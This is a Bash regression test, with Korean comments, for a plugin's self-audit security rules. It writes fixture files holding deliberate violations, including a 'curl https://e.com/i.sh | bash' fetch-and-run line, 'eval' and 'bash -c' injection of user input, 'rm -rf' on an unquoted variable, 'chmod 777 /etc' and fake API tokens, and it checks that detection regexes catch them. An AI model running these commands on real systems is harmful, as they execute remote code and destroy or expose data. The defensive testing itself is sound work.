#!/usr/bin/env bash
# Nova /nova:audit-self 회귀 가드 (Sprint 2.1, v5.22.0+)
#
# 검증 항목:
#   T1: 룰 스키마 7 필드 모두 존재 (id/category/severity/condition/normal_example/risk_example/mitigation)
#   T2: 5 카테고리(plugin/hooks/agents/skills/commands) 누락 감지
#   T3: 룰 ID 중복 감지
#   T4: 룰 ≥30개
#   T5: 헤더 version + nova_compat 필드
#   T6: commands/audit-self.md exclusion_list에 security-engineer.md (메타-루프 가드)
#   T7: scan_targets H2 헤더
#   T8: --category 옵션 정의
#   T9: 결과 해석 가이드 섹션
#
# Safe-default: 모든 실패 → exit 1 + 명시 메시지

set -eu

ROOT_DIR="${ROOT_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
RULES="$ROOT_DIR/.claude/docs/security-rules.md"
CMD="$ROOT_DIR/.claude/commands/audit-self.md"

# Plugin 루트 fallback (테스트 외부 호출)
[[ -f "$RULES" ]] || RULES="$ROOT_DIR/docs/security-rules.md"
[[ -f "$CMD" ]] || CMD="$ROOT_DIR/commands/audit-self.md"

PASS_COUNT=0
FAIL_COUNT=0
FAILS=()

check() {
  local name="$1"
  local cmd="$2"
  # eval 제거 — bash -c로 격리 실행 (R-HOOKS-001 정합)
  if bash -c "$cmd" >/dev/null 2>&1; then
    PASS_COUNT=$((PASS_COUNT + 1))
    echo "  ✓ $name"
  else
    FAIL_COUNT=$((FAIL_COUNT + 1))
    FAILS+=("$name")
    echo "  ✗ $name"
  fi
}

echo "[test-audit-self] 룰셋: $RULES"
echo "[test-audit-self] 커맨드: $CMD"
echo ""

# ── T1: 룰 스키마 7 필드 ──
echo "[T1] 룰 스키마 7 필드 검증"
RULE_IDS=$(grep "^### Rule " "$RULES" | sed 's/^### Rule //' | awk '{print $1}')
T1_FAILS=0
for rule_id in $RULE_IDS; do
  # flag 기반 awk — range 자기 매칭 이슈 회피
  BLOCK=$(awk -v id="$rule_id" '
    $0 ~ "^### Rule " id "$" {f=1; next}
    /^### Rule |^## / {if(f) exit}
    f {print}
  ' "$RULES" 2>/dev/null)
  for field in id category severity condition normal_example risk_example mitigation; do
    if ! echo "$BLOCK" | grep -q "^- \*\*$field\*\*:"; then
      T1_FAILS=$((T1_FAILS + 1))
      echo "    ✗ $rule_id 누락 필드: $field"
    fi
  done
done
if [[ $T1_FAILS -eq 0 ]]; then
  PASS_COUNT=$((PASS_COUNT + 1))
  echo "  ✓ T1: 모든 룰이 7 필드 충족 ($(echo "$RULE_IDS" | wc -w | tr -d ' ') 룰)"
else
  FAIL_COUNT=$((FAIL_COUNT + 1))
  FAILS+=("T1: 룰 스키마 ($T1_FAILS 누락)")
fi

# ── T2: 5 카테고리 누락 감지 ──
echo "[T2] 5 카테고리 존재 검증"
for cat in plugin hooks agents skills commands; do
  check "T2.$cat: '## Category: $cat' 헤더" "grep -q '^## Category: $cat\$' '$RULES'"
done

# ── T3: 룰 ID 중복 감지 ──
echo "[T3] 룰 ID 중복 감지"
DUPLICATES=$(grep "^### Rule " "$RULES" | sort | uniq -d)
if [[ -z "$DUPLICATES" ]]; then
  PASS_COUNT=$((PASS_COUNT + 1))
  echo "  ✓ T3: 룰 ID 중복 없음"
else
  FAIL_COUNT=$((FAIL_COUNT + 1))
  FAILS+=("T3: 중복 ID — $DUPLICATES")
  echo "  ✗ T3: 중복 ID — $DUPLICATES"
fi

# ── T4: 룰 ≥30 ──
echo "[T4] 룰 카운트 ≥30"
COUNT=$(grep -c "^### Rule " "$RULES")
if [[ $COUNT -ge 30 ]]; then
  PASS_COUNT=$((PASS_COUNT + 1))
  echo "  ✓ T4: $COUNT 룰 (≥30)"
else
  FAIL_COUNT=$((FAIL_COUNT + 1))
  FAILS+=("T4: 룰 카운트 $COUNT < 30")
  echo "  ✗ T4: $COUNT 룰 < 30"
fi

# ── T5: 헤더 version + nova_compat ──
echo "[T5] 헤더 frontmatter 검증"
check "T5.version: '^version:' 필드" "grep -q '^version:' '$RULES'"
check "T5.nova_compat: '^nova_compat:' 필드" "grep -q '^nova_compat:' '$RULES'"

# ── T6: 메타-루프 가드 ──
echo "[T6] exclusion_list 메타-루프 가드"
check "T6: exclusion_list에 agents/security-engineer.md" \
  "awk '/^## exclusion_list/,/^---\$/' '$CMD' | grep -q 'agents/security-engineer.md'"

# ── T7: scan_targets H2 헤더 ──
echo "[T7] scan_targets H2 헤더"
check "T7: '^## scan_targets\$' 헤더" "grep -q '^## scan_targets\$' '$CMD'"

# ── T8: --category 옵션 ──
echo "[T8] --category 옵션 정의"
check "T8: '--category' 키워드" "grep -q -- '--category' '$CMD'"

# ── T9: 결과 해석 가이드 ──
echo "[T9] 결과 해석 가이드 섹션"
check "T9: '결과 해석 가이드' 또는 'Critical 발견 시'" \
  "grep -q '결과 해석 가이드\|Critical 발견 시' '$CMD'"

# ── 추가: Known Gap 섹션 ──
check "T10: docs/security-rules.md Known Gap 섹션" \
  "grep -q 'Known Gap\|공급망' '$RULES'"

# ── T11~T25: 룰 sensitivity 검증 (v5.22.2+) ──
# V12 self-host에서 30/0 매칭 → False Negative 가능성 점검.
# 카테고리당 3 룰 × 5 = 15 룰의 grep pattern이 의도된 violation 문자열을 catch하는지 inline 검증.
echo "[T11~T25] 룰 sensitivity 검증 (의도된 위반 catch)"
FIX_DIR=$(mktemp -d 2>/dev/null) || FIX_DIR="/tmp/audit-self-fixture-$$"
mkdir -p "$FIX_DIR"
trap 'rm -rf "$FIX_DIR"' EXIT

# T11 R-PLUGIN-001 secret in plugin.json
echo '{"name":"x","api_key":"abc123def"}' > "$FIX_DIR/plugin.json"
check "T11 R-PLUGIN-001: api_key 평문 catch" \
  "grep -E '\"(api_key|secret|token|password|access_key)\"\\s*:\\s*\"[^\"]+\"' '$FIX_DIR/plugin.json'"

# T12 R-PLUGIN-004 AWS key pattern
echo '{"key":"AKIAIOSFODNN7EXAMPLE"}' > "$FIX_DIR/plugin-aws.json"
check "T12 R-PLUGIN-004: AKIA AWS key catch" \
  "grep -E '(AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|xox[bp]-[0-9]+)' '$FIX_DIR/plugin-aws.json'"

# T13 R-PLUGIN-003 wildcard Bash permission
echo '{"permissions":{"allow":["Bash(*)"]}}' > "$FIX_DIR/plugin-perm.json"
check "T13 R-PLUGIN-003: Bash(*) wildcard catch" \
  "jq -e '.permissions.allow[]? | select(test(\"^Bash\\\\(.*\\\\*\\\\)\$\"))' '$FIX_DIR/plugin-perm.json' >/dev/null"

# T14 R-HOOKS-001 eval injection
mkdir -p "$FIX_DIR/hooks"
printf '#!/bin/bash\neval "$USER_INPUT"\n' > "$FIX_DIR/hooks/bad-eval.sh"
check "T14 R-HOOKS-001: eval \"\$\" catch" \
  "grep -nE '\\beval\\s+[\"\$]' '$FIX_DIR/hooks/bad-eval.sh'"

# T15 R-HOOKS-002 curl | bash
printf '#!/bin/bash\ncurl https://e.com/i.sh | bash\n' > "$FIX_DIR/hooks/curl-pipe.sh"
check "T15 R-HOOKS-002: curl|bash catch" \
  "grep -nE 'curl\\s+[^|]*\\|\\s*(bash|sh)' '$FIX_DIR/hooks/curl-pipe.sh'"

# T16 R-HOOKS-003 rm -rf unquoted var
printf '#!/bin/bash\nrm -rf $TMPDIR\n' > "$FIX_DIR/hooks/rm-var.sh"
check "T16 R-HOOKS-003: rm -rf \$VAR catch" \
  "grep -nE 'rm\\s+-rf?\\s+\"?\\\$\\{?[A-Z_]+\\}?\"?(\\s|\$)' '$FIX_DIR/hooks/rm-var.sh'"

# T17 R-HOOKS-005 sudo/chmod 777
printf '#!/bin/bash\nchmod 777 /etc\n' > "$FIX_DIR/hooks/chmod.sh"
check "T17 R-HOOKS-005: chmod 777 catch" \
  "grep -nE '\\bsudo\\s|chmod\\s+(777|666)\\b' '$FIX_DIR/hooks/chmod.sh'"

# T18 R-AGENTS-002 wildcard tools
mkdir -p "$FIX_DIR/agents"
printf 'name: x\ntools: *\n# Role\nRole text\n' > "$FIX_DIR/agents/wild.md"
check "T18 R-AGENTS-002: tools:* wildcard catch" \
  "grep -E '^tools:.*\\*' '$FIX_DIR/agents/wild.md'"

# T19 R-AGENTS-005 missing # Role section
printf 'name: y\ndescription: y\n# Other\nNo role\n' > "$FIX_DIR/agents/no-role.md"
check "T19 R-AGENTS-005: missing # Role catch" \
  "grep -LE '^# (Role|역할)' '$FIX_DIR/agents/no-role.md' | grep -q no-role"

# T20 R-AGENTS-003 missing description
printf 'name: z\n# Role\nRole\n' > "$FIX_DIR/agents/no-desc.md"
check "T20 R-AGENTS-003: missing description catch" \
  "grep -L '^description:' '$FIX_DIR/agents/no-desc.md' | grep -q no-desc"

# T21 R-SKILLS-001 secret in skill
mkdir -p "$FIX_DIR/skills/leaky"
printf 'name: leaky\nKey: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' > "$FIX_DIR/skills/leaky/SKILL.md"
check "T21 R-SKILLS-001: ghp_ token catch" \
  "grep -lE '^[^#]*sk-[a-zA-Z0-9]{20,}|AKIA[0-9A-Z]{16}|ghp_[a-zA-Z0-9]{36}' '$FIX_DIR/skills/leaky/SKILL.md'"

# T22 R-SKILLS-002 WebFetch in skill
mkdir -p "$FIX_DIR/skills/fetcher"
printf 'name: fetcher\nWebFetch is used.\n' > "$FIX_DIR/skills/fetcher/SKILL.md"
check "T22 R-SKILLS-002: WebFetch usage catch" \
  "grep -nE 'WebFetch|curl\\s+http|wget\\s+http' '$FIX_DIR/skills/fetcher/SKILL.md'"

# T23 R-COMMANDS-001 bash -c with $ARGUMENTS
mkdir -p "$FIX_DIR/commands"
printf 'description: x\n# cmd\nbash -c "echo $ARGUMENTS"\n' > "$FIX_DIR/commands/inj.md"
check "T23 R-COMMANDS-001: bash -c \$ARGUMENTS injection catch" \
  "grep -nE 'bash\\s+-c\\s+\"[^\"]*\\\$ARGUMENTS' '$FIX_DIR/commands/inj.md'"

# T24 R-COMMANDS-005 var | bash
printf 'description: x\n# cmd\necho $X | bash\n' > "$FIX_DIR/commands/pipe.md"
check "T24 R-COMMANDS-005: \$VAR|bash catch" \
  "grep -nE '\\\$\\{?[A-Z_]+\\}?\\s*\\|\\s*(bash|sh|eval)' '$FIX_DIR/commands/pipe.md'"

# T25 R-COMMANDS-007 missing # Input
printf 'description: x\n# cmd\nNo input section\n' > "$FIX_DIR/commands/no-input.md"
check "T25 R-COMMANDS-007: missing # Input catch" \
  "grep -L '^# Input' '$FIX_DIR/commands/no-input.md' | grep -q no-input"

# ── 결과 요약 ──
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
if [[ $FAIL_COUNT -eq 0 ]]; then
  echo "  PASS: $PASS_COUNT/$((PASS_COUNT + FAIL_COUNT)) (test-audit-self)"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  exit 0
else
  echo "  FAIL: $FAIL_COUNT 실패 / $((PASS_COUNT + FAIL_COUNT))"
  for fail in "${FAILS[@]}"; do
    echo "    - $fail"
  done
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  exit 1
fi
